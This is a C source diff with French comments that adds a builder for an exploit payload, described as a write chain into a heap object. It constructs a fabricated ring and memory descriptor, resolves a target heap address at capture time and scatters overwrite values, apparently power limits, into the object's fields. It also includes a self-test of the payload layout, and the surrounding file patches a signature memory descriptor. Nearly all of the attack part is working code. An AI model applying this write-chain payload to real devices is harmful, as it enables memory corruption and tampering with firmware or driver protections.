@@ -59,6 +59,13 @@
 #define TL_LIST_OFF       0x500u    /* la tête de liste */
 #define TL_MAGIC_BYTE     0x08u
 
+/* ---- 4.44 ---- le layout v444 (lab/jalon411/v444_transfer_list_build.py)
+ * la liste D (8 entrées) @0x500, la liste f18 (4 entrées) @0x540. */
+#define TL444_D_LIST_OFF      0x500u
+#define TL444_D_LIST_COUNT    8u
+#define TL444_F18_LIST_OFF    0x540u
+#define TL444_F18_LIST_COUNT  4u
+
 typedef struct {
     uint64_t slot0;       /* le slot de départ du ring fabriqué */
     uint64_t capacity;    /* la capacité (slots u64) — le wrap à 1 */
@@ -127,8 +134,63 @@ tl_patch_signature_memdesc(uint8_t *pSignatureVa /* memdesc mappé */)
     memcpy(pSignatureVa, img, TL_MEMDESC_SIZE);
 }
 
+/*
+ * ---- 4.44 ---- le builder v444 : le payload de la chaîne d'écriture
+ * vers l'objet 0x6d0. La liste D = le scatter du tableau des bases
+ * (les D u64 à obj+0x618+idx*0x10, les slots {1,3,5,7} relatifs à
+ * dest = obj+0x610 — UNE invocation a3=8). La liste f18 = les 4
+ * records persistants (obj+0x18+idx*0x30, espacés 0x30 = 4 invocations
+ * a3=1 — le a1-refresh n'existe pas dans le booter, v444e).
+ *
+ * dest = le PARAMÈTRE RUNTIME (obj+0x610, l'adresse heap de l'objet
+ * résolue le jour capture) — le placeholder 0 = refusé au boot par le
+ * runbook (le garde dest==0 -> la boucle inerte, PROUVÉ TT-D).
+ *
+ * reading_percent != 0 -> la lecture percent (D=280000000 µW,
+ * f18=112) ; == 0 -> la lecture permille (D=28000000, f18=1120).
+ * L'unité = INDECIDABLE-BY-BYTES (v444d) — l'expérience U2 décide.
+ */
+void
+tl_build_payload_444(uint8_t *img /* [TL_MEMDESC_SIZE] */,
+                     uint64_t dest, uint64_t slot0, uint64_t capacity,
+                     int reading_percent)
+{
+    uint64_t dval, fval;
+    uint64_t dlist[TL444_D_LIST_COUNT];
+    uint64_t flist[TL444_F18_LIST_COUNT];
+    uint32_t i;
+
+    if (reading_percent) {
+        dval = 280000000ull;   /* 280 W en µW — v444d percent */
+        fval = 112ull;         /* 100 x 28/25 — le pourcentage */
+    } else {
+        dval = 28000000ull;    /* la lecture permille (v444d) */
+        fval = 1120ull;
+    }
+    /* le scatter D : les slots {0,1,2,3,4,5,6,7} =
+     * [D0, D0, P, D1, P, D2, P, D3] — D aux slots impairs de dest+8,
+     * P = 0 aux {B,C} (le clobber nommé, auto-réparé par la recompute) */
+    dlist[0] = dval;  dlist[1] = dval;
+    dlist[2] = 0;     dlist[3] = dval;
+    dlist[4] = 0;     dlist[5] = dval;
+    dlist[6] = 0;     dlist[7] = dval;
+    for (i = 0; i < TL444_F18_LIST_COUNT; i++)
+        flist[i] = fval;
+
+    memset(img, 0xFF, TL_MEMDESC_SIZE);
+    tl_store_u64(img + TL_CTX_SLOT0_OFF, slot0);
+    tl_store_u64(img + TL_CTX_CAP_OFF,   capacity);
+    tl_store_u64(img + TL_CTX_DEST_OFF,  dest);
+    img[TL_CTX_MAGIC_OFF] = TL_MAGIC_BYTE;
+    for (i = 0; i < TL444_D_LIST_COUNT; i++)
+        tl_store_u64(img + TL444_D_LIST_OFF + 8u * i, dlist[i]);
+    for (i = 0; i < TL444_F18_LIST_COUNT; i++)
+        tl_store_u64(img + TL444_F18_LIST_OFF + 8u * i, flist[i]);
+}
+
 #ifdef TL_SELFTEST
-/* le test unitaire C : les invariants de layout + le dump optionnel */
+/* le test unitaire C : les invariants de layout + le dump optionnel.
+ * 4.44 : TL444 = les invariants du builder v444 (le 5e groupe). */
 int
 main(int argc, char **argv)
 {
@@ -162,6 +224,53 @@ main(int argc, char **argv)
     if (argc > 1) {
         FILE *f = fopen(argv[1], "wb");
         if (f) { fwrite(img, 1, TL_MEMDESC_SIZE, f); fclose(f); }
+    }
+
+    /* ---- 4.44 : le 5e groupe = les invariants v444 (le dump argv[2]) */
+    if (argc > 2) {
+        int f444 = 0;
+        uint8_t img444[TL_MEMDESC_SIZE];
+        tl_build_payload_444(img444, 0x12345678ull, 0, 0x400, 1);
+        /* TL444-T1 : le ctx */
+        if (img444[TL_CTX_SLOT0_OFF] != 0) f444++;
+        if (img444[TL_CTX_DEST_OFF]   != 0x78 ||
+            img444[TL_CTX_DEST_OFF+1] != 0x56 ||
+            img444[TL_CTX_DEST_OFF+2] != 0x34 ||
+            img444[TL_CTX_DEST_OFF+3] != 0x12) f444++;
+        if (img444[TL_CTX_MAGIC_OFF] != TL_MAGIC_BYTE) f444++;
+        /* TL444-T2 : la liste D = [D,D,0,D,0,D,0,D], D = 0x10B07600 */
+        {
+            static const uint64_t want[8] = {
+                0x10B07600ull, 0x10B07600ull, 0, 0x10B07600ull,
+                0, 0x10B07600ull, 0, 0x10B07600ull
+            };
+            for (i = 0; i < 8; i++) {
+                uint64_t got = 0;
+                unsigned k;
+                for (k = 0; k < 8; k++)
+                    got |= (uint64_t)img444[TL444_D_LIST_OFF + 8*i + k] << (8*k);
+                if (got != want[i]) f444++;
+            }
+        }
+        /* TL444-T3 : la liste f18 = 4 x 0x70 */
+        for (i = 0; i < 4; i++) {
+            uint64_t got = 0;
+            unsigned k;
+            for (k = 0; k < 8; k++)
+                got |= (uint64_t)img444[TL444_F18_LIST_OFF + 8*i + k] << (8*k);
+            if (got != 0x70ull) f444++;
+        }
+        /* TL444-T4 : hors ctx/listes = 0xFF (entre 0x560 et la fin) */
+        for (i = TL444_F18_LIST_OFF + 8 * TL444_F18_LIST_COUNT;
+             i < TL_MEMDESC_SIZE; i++)
+            if (img444[i] != 0xFF) { f444++; break; }
+        printf("tl444_c_selftest: %s (%d checks failed of 4)\n",
+               f444 ? "FAIL" : "PASS", f444);
+        fails += f444;
+        if (argc > 2) {
+            FILE *f2 = fopen(argv[2], "wb");
+            if (f2) { fwrite(img444, 1, TL_MEMDESC_SIZE, f2); fclose(f2); }
+        }
     }
     return fails ? 1 : 0;
 }
